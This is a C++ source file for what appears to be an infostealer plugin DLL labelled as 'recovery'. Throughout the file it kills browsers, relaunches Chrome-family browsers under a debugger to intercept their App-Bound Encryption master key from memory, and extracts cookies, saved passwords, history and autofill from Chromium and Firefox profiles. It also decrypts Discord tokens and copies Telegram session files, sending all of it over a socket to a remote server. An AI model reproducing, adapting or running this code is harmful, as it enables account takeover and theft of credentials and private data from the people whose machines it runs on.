    for (const auto& r : roots) { fs::path p = fs::path(r) / "Mozilla Firefox"; if (fs::exists(p / "nss3.dll")) { nss_dir = p; break; } }
    std::error_code ec;
    for (const auto& entry : fs::directory_iterator(ud, ec)) if (!ec && entry.is_directory()) {
        fs::path p = entry.path(); if (fs::exists(p / "cookies.sqlite") || fs::exists(p / "logins.json")) {
            std::string p_name = p.filename().string(), out = config.output_dir + "/" + p_name;
            extract_firefox_cookies(sock, p, out, config.name, p_name); extract_firefox_history(sock, p, out); extract_firefox_autofill(sock, p, out);
            if (!nss_dir.empty()) extract_firefox_passwords(sock, p, out, nss_dir);
        }
    }
}

// --- Path & Root Discovery (Redefined for correct scope) ---

std::vector<uint32_t> get_all_threads(uint32_t process_id);
void set_hardware_breakpoint(uint32_t tid, size_t addr);
void clear_hardware_breakpoints(uint32_t pid);
void set_resume_flag(uint32_t tid);
InterceptPoint find_target_address(HANDLE h_proc, void* base, const std::string& name);
std::vector<uint8_t> debug_loop_get_key(SOCKET sock, uint32_t pid, const BrowserConfig& config);

// --- Browser Logic (Continued) ---

void extract_telegram_session(SOCKET sock) {
    wchar_t* ad; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ad) != S_OK) return;
    fs::path t = fs::path(ad) / L"Telegram Desktop" / L"tdata"; CoTaskMemFree(ad); if (!fs::exists(t)) return;
    send_status(sock, "Extracting Telegram...");
    for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) if (fs::exists(t / f)) send_file_from_disk(sock, t / f, "telegram session/tdata/" + std::string(f));
    std::error_code ec; for (const auto& entry : fs::directory_iterator(t, ec)) if (!ec && entry.is_directory()) {
        std::string fn = entry.path().filename().string();
        if (fn.length() == 16 && std::all_of(fn.begin(), fn.end(), [](unsigned char c){ return std::isxdigit(c); })) {
            for (const auto& sub : fs::recursive_directory_iterator(entry.path(), ec)) if (!ec && !sub.is_directory()) {
                std::string sn = sub.path().filename().string(); if (sn.find(".log") == std::string::npos && sn.find("dumps") == std::string::npos) send_file_from_disk(sock, sub.path(), "telegram session/tdata/" + fn + "/" + fs::relative(sub.path(), entry.path()).string());
            }
        }
    }
}

void extract_discord_tokens(SOCKET sock, const std::wstring& discord_path_w, const std::string& output_name) {
    fs::path dp(discord_path_w); if (!fs::exists(dp)) return;
    std::vector<uint8_t> mk; bool dpapi; if (!get_v10_key(discord_path_w, mk, dpapi)) return;
    fs::path ldb = dp / "Local Storage" / "leveldb"; if (!fs::exists(ldb)) return;
    std::set<std::string> tokens; std::regex enc_r("dQw4w9WgXcQ:([^\"\\s\\x00-\\x1F]+)"), plain_r("[a-zA-Z0-9_-]{24,28}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{25,110}");
    std::error_code ec; for (const auto& entry : fs::directory_iterator(ldb, ec)) {
        if (!ec && (entry.path().extension() == ".log" || entry.path().extension() == ".ldb")) {
            std::ifstream ifs(entry.path(), std::ios::binary); if (ifs) {
                std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
                for (auto i = std::sregex_iterator(content.begin(), content.end(), enc_r); i != std::sregex_iterator(); ++i) {
                    std::string enc = (*i)[1].str(); if (!enc.empty() && enc.back() == '\\') enc.pop_back();
                    std::vector<uint8_t> eb = base64_decode(enc); if (!eb.empty()) { std::vector<uint8_t> dec = decrypt_blob(eb, mk, {}, false); if (!dec.empty()) tokens.insert(std::string(dec.begin(), dec.end())); }
                }
                for (auto i = std::sregex_iterator(content.begin(), content.end(), plain_r); i != std::sregex_iterator(); ++i) tokens.insert((*i).str());
            }
        }
    }
    if (!tokens.empty()) {
        std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
        for (const auto& t : tokens) { txt << t << "\n"; if (!first) jsn << ",\n"; jsn << "  \"" << json_escape(t) << "\""; first = false; }
        jsn << "\n]"; send_string_to_server(sock, "discord/" + output_name + "/tokens.txt", txt.str()); send_string_to_server(sock, "discord/" + output_name + "/tokens.json", jsn.str());
    }
}

// --- Debugger Loop Implementations ---

std::vector<uint32_t> get_all_threads(uint32_t process_id) {
    std::vector<uint32_t> threads; HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te; te.dwSize = sizeof(te);
        if (Thread32First(snap, &te)) do { if (te.th32OwnerProcessID == process_id) threads.push_back(te.th32ThreadID); } while (Thread32Next(snap, &te));
        CloseHandle(snap);
    }
    return threads;
}

void set_hardware_breakpoint(uint32_t tid, size_t addr) {
    HANDLE h = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
    if (h) { SuspendThread(h); CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS; if (GetThreadContext(h, &ctx)) { ctx.Dr0 = addr; ctx.Dr7 = (ctx.Dr7 & ~0b11) | 0b01; SetThreadContext(h, &ctx); } ResumeThread(h); CloseHandle(h); }
}

void clear_hardware_breakpoints(uint32_t pid) {
    for (uint32_t tid : get_all_threads(pid)) {
        HANDLE h = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
        if (h) { SuspendThread(h); CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS; if (GetThreadContext(h, &ctx)) { ctx.Dr0 = 0; ctx.Dr7 &= ~0b11; SetThreadContext(h, &ctx); } ResumeThread(h); CloseHandle(h); }
    }
}

void set_resume_flag(uint32_t tid) {
    HANDLE h = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
    if (h) { SuspendThread(h); CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_CONTROL; if (GetThreadContext(h, &ctx)) { ctx.EFlags |= 0x10000; SetThreadContext(h, &ctx); } ResumeThread(h); CloseHandle(h); }
}

InterceptPoint find_target_address(HANDLE h_proc, void* base, const std::string& name) {
    InterceptPoint res; IMAGE_DOS_HEADER dos; SIZE_T br; if (!ReadProcessMemory(h_proc, base, &dos, sizeof(dos), &br)) return res;
    IMAGE_NT_HEADERS64 nt; if (!ReadProcessMemory(h_proc, (BYTE*)base + dos.e_lfanew, &nt, sizeof(nt), &br)) return res;
    std::vector<IMAGE_SECTION_HEADER> secs(nt.FileHeader.NumberOfSections);
    ReadProcessMemory(h_proc, (BYTE*)base + dos.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader, secs.data(), secs.size() * sizeof(IMAGE_SECTION_HEADER), &br);
    std::vector<std::string> tgs = {"OSCrypt.AppBoundProvider.Decrypt.ResultCode", "OSCrypt.AppBoundProvider.Encrypt.ResultCode", "OSCrypt.AppBoundProvider.Decrypt.Result", "OSCrypt.AppBoundProvider.Encrypt.Result"};
    size_t s_va = 0;
    for (const auto& t : tgs) {
        std::vector<uint8_t> nd(t.begin(), t.end());
        for (const auto& s : secs) if (strstr((char*)s.Name, ".rdata") || strstr((char*)s.Name, ".data")) {
            std::vector<uint8_t> dt(s.Misc.VirtualSize); ReadProcessMemory(h_proc, (BYTE*)base + s.VirtualAddress, dt.data(), dt.size(), &br);
            auto it = std::search(dt.begin(), dt.end(), nd.begin(), nd.end()); if (it != dt.end()) { s_va = (size_t)base + s.VirtualAddress + std::distance(dt.begin(), it); break; }
        }
        if (s_va) break;
    }
    if (!s_va) return res;
    for (const auto& s : secs) if (strstr((char*)s.Name, ".text")) {
        std::vector<uint8_t> dt(s.Misc.VirtualSize); ReadProcessMemory(h_proc, (BYTE*)base + s.VirtualAddress, dt.data(), dt.size(), &br);
        for (size_t i = 0; i + 7 <= dt.size(); ++i) if (((dt[i] & 0xF8) == 0x48 || (dt[i] & 0xF8) == 0x4C) && dt[i+1] == 0x8D && (dt[i+2] & 0xC7) == 0x05) {
            if ((size_t)((int64_t)((size_t)base + s.VirtualAddress + i + 7) + *(int32_t*)&dt[i+3]) == s_va) { res.address = (size_t)base + s.VirtualAddress + i; res.reg_index = (dt[i+2] >> 3) & 7; if (dt[i] & 0x04) res.reg_index += 8; return res; }
        }
    }
    return res;
}

std::vector<uint8_t> debug_loop_get_key(SOCKET sock, uint32_t pid, const BrowserConfig& config) {
    DEBUG_EVENT de = {0}; size_t t_rva = 0; std::vector<uint8_t> key; DWORD start = GetTickCount(); std::map<uint32_t, HANDLE> procs; std::map<uint32_t, size_t> bases; std::set<size_t> patched; int p_reg = -1;
    while (GetTickCount() - start < 30000) {
        if (!WaitForDebugEvent(&de, 100)) continue;
        if (de.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) procs[de.dwProcessId] = de.u.CreateProcessInfo.hProcess;
        else if (de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) { procs.erase(de.dwProcessId); if (de.dwProcessId == pid) { ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE); return key; } }
        else if (de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT) {
            wchar_t buf[MAX_PATH]; if (GetFinalPathNameByHandleW(de.u.LoadDll.hFile, buf, MAX_PATH, 0)) {
                std::wstring path = buf, name = utf8_to_wstring(config.dll_name);
                if (path.find(name) != std::wstring::npos) {
                    bases[de.dwProcessId] = (size_t)de.u.LoadDll.lpBaseOfDll;
                    if (!t_rva) { InterceptPoint ip = find_target_address(procs[de.dwProcessId], de.u.LoadDll.lpBaseOfDll, config.name); if (ip.address) { t_rva = ip.address - (size_t)de.u.LoadDll.lpBaseOfDll; p_reg = ip.reg_index; send_status(sock, "Pattern found in " + config.dll_name); } }
                    if (t_rva) {
                        size_t addr = (size_t)de.u.LoadDll.lpBaseOfDll + t_rva; for (uint32_t tid : get_all_threads(de.dwProcessId)) set_hardware_breakpoint(tid, addr);
                        uint8_t int3 = 0xCC; SIZE_T w; if (WriteProcessMemory(procs[de.dwProcessId], (LPVOID)addr, &int3, 1, &w)) patched.insert(addr);
                    }
                }
            }
        } else if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
            uint32_t code = de.u.Exception.ExceptionRecord.ExceptionCode; size_t addr = (size_t)de.u.Exception.ExceptionRecord.ExceptionAddress;
            if (code == EXCEPTION_SINGLE_STEP || code == EXCEPTION_BREAKPOINT) {
                size_t cur = t_rva && bases.count(de.dwProcessId) ? bases[de.dwProcessId] + t_rva : 0;
                if (addr == cur || (code == EXCEPTION_BREAKPOINT && patched.count(addr))) {
                    HANDLE h = OpenThread(THREAD_GET_CONTEXT, FALSE, de.dwThreadId);
                    if (h) {
                        CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_FULL;
                        if (GetThreadContext(h, &ctx)) {
                            DWORD64 r[] = {ctx.Rax, ctx.Rcx, ctx.Rdx, ctx.Rbx, ctx.Rsp, ctx.Rbp, ctx.Rsi, ctx.Rdi, ctx.R8, ctx.R9, ctx.R10, ctx.R11, ctx.R12, ctx.R13, ctx.R14, ctx.R15};
                            std::vector<DWORD64> cands; if (p_reg >= 0 && p_reg < 16) cands.push_back(r[p_reg]);
                            for (int i=0; i<16; ++i) if (i != p_reg) cands.push_back(r[i]);
                            for (DWORD64 ptr : cands) if (ptr > 0x10000) {
                                std::vector<uint8_t> b(32); SIZE_T rb; if (ReadProcessMemory(procs[de.dwProcessId], (LPCVOID)ptr, b.data(), 32, &rb)) {
                                    auto chk = [](const std::vector<uint8_t>& k){ if (k.size() != 32) return false; for (uint8_t x : k) if (x) return true; return false; };
                                    if (chk(b)) { key = b; break; }
                                    uint64_t p2 = *(uint64_t*)&b[0], l2 = *(uint64_t*)&b[8];
                                    if (l2 == 32 && p2 > 0x10000) { std::vector<uint8_t> b2(32); if (ReadProcessMemory(procs[de.dwProcessId], (LPCVOID)p2, b2.data(), 32, &rb) && chk(b2)) { key = b2; break; } }
                                }
                            }
                        }
                        CloseHandle(h);
                    }
                    if (!key.empty()) { for (auto const& p : procs) clear_hardware_breakpoints(p.first); ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE); return key; }
                }
                if (code == EXCEPTION_SINGLE_STEP) set_resume_flag(de.dwThreadId);
            }
        }
        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
    }
    return key;
}

// --- Main Runner ---

void run_recovery(SOCKET sock) {
    if (sock != INVALID_SOCKET) { std::string msg = "{\"action\":\"recovery_start\"}\r\n"; send_with_mutex(sock, msg.c_str(), (int)msg.size()); }
    send_status(sock, "Starting recovery...");
    std::vector<BrowserConfig> configs = {
        {"Google Chrome", "chrome.exe", {L"chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
        {"Microsoft Edge", "msedge.exe", {L"msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"User Data"}, "browsers/Microsoft Edge", "edge_tmp", true, false, true, false},
        {"Edge WebView2", "msedge.exe", {L"msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"WebView2", L"EBWebView"}, "browsers/Edge WebView2", "webview2_tmp", true, false, true, false},
        {"Brave", "brave.exe", {L"brave.exe"}, "chrome.dll", {L"BraveSoftware", L"Brave-Browser", L"User Data"}, "browsers/Brave", "brave_tmp", false, false, true, false},
        {"Opera Stable", "opera.exe", {L"launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera Stable"}, "browsers/Opera Stable", "opera_tmp", false, true, false, false},
        {"Opera GX", "opera.exe", {L"launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera GX Stable"}, "browsers/Opera GX", "operagx_tmp", false, true, false, false},
        {"Mozilla Firefox", "firefox.exe", {L"firefox.exe"}, "nss3.dll", {L"Mozilla", L"Firefox", L"Profiles"}, "browsers/Mozilla Firefox", "firefox_tmp", false, true, false, true},
        {"Waterfox", "waterfox.exe", {L"waterfox.exe"}, "nss3.dll", {L"Waterfox", L"Profiles"}, "browsers/Waterfox", "waterfox_tmp", false, true, false, true},
        {"LibreWolf", "librewolf.exe", {L"librewolf.exe"}, "nss3.dll", {L"LibreWolf", L"Profiles"}, "browsers/LibreWolf", "librewolf_tmp", false, true, false, true},
        {"Yandex Browser", "browser.exe", {L"browser.exe"}, "browser.dll", {L"Yandex", L"YandexBrowser", L"User Data"}, "browsers/Yandex Browser", "yandex_tmp", false, false, false, false}
    };
    send_status(sock, "Terminating processes...");
    for (const auto& c : {"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "browser.exe", "firefox.exe"}) {
        std::wstring w(utf8_to_wstring(c)); HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) { PROCESSENTRY32W pe; pe.dwSize = sizeof(pe); if (Process32FirstW(snap, &pe)) do { if (_wcsicmp(pe.szExeFile, w.c_str()) == 0) { HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID); if (h) { TerminateProcess(h, 0); CloseHandle(h); } } } while (Process32NextW(snap, &pe)); CloseHandle(snap); }
    }
    for (const auto& config : configs) {
        std::wstring ud = get_user_data_dir(config.user_data_subdir, config.use_roaming); if (ud.empty()) continue;
        send_status(sock, "Checking " + config.name);
        if (config.is_firefox) { extract_firefox_data(sock, config, ud); continue; }
        if (!config.has_abe) { extract_all_profiles_data(sock, {}, config, ud); continue; }
        std::wstring exe = get_browser_exe_path(utf8_to_wstring(config.process_name));
        if (exe.empty()) { for (const auto& r : get_search_roots()) for (const auto& p : config.exe_paths) { fs::path f = fs::path(r) / p; if (fs::exists(f)) { exe = f.wstring(); break; } } }
        if (exe.empty()) { extract_all_profiles_data(sock, {}, config, ud); continue; }
        STARTUPINFOW si = {sizeof(si)}; si.cb = sizeof(si); PROCESS_INFORMATION pi = {0}; std::wstring cmd = L"\"" + exe + L"\" --no-sandbox --disable-gpu --no-first-run --no-default-browser-check";
        std::vector<wchar_t> cb(cmd.begin(), cmd.end()); cb.push_back(0);
        if (CreateProcessW(NULL, cb.data(), NULL, NULL, FALSE, DEBUG_PROCESS | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
            std::vector<uint8_t> v20 = debug_loop_get_key(sock, pi.dwProcessId, config);
            TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            if (!v20.empty()) { send_status(sock, "Master key intercepted for " + config.name); extract_all_profiles_data(sock, v20, config, ud); }
            else { send_status(sock, "Key interception timeout for " + config.name); extract_all_profiles_data(sock, {}, config, ud); }
        } else extract_all_profiles_data(sock, {}, config, ud);
    }
    wchar_t* app; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &app) == S_OK) {
        fs::path r(app); CoTaskMemFree(app);
        for (const auto& d : {std::pair<std::string, std::wstring>{"Discord", L"discord"}, {"Discord Canary", L"discordcanary"}, {"Discord PTB", L"discordptb"}}) { fs::path p = r / d.second; if (fs::exists(p)) extract_discord_tokens(sock, p.wstring(), d.first); }
    }
    extract_telegram_session(sock); send_status(sock, "Recovery completed.");
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) { run_recovery(sock); }
extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {}
